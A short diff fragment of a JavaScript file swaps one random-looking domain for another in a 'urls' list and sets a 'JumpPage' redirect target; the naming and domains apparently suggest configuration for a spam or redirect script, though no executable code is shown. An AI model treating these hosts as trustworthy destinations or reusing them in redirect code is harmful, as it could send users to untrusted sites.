@@ -37,7 +37,7 @@ var emails = [
 ];
 
 var urls=[
-	'hlfwaolt.com', 
+	'fdpscnpo.cc', 
 ];                                                                                                                  
 
 var JumpPage="https://cgbgw.com";
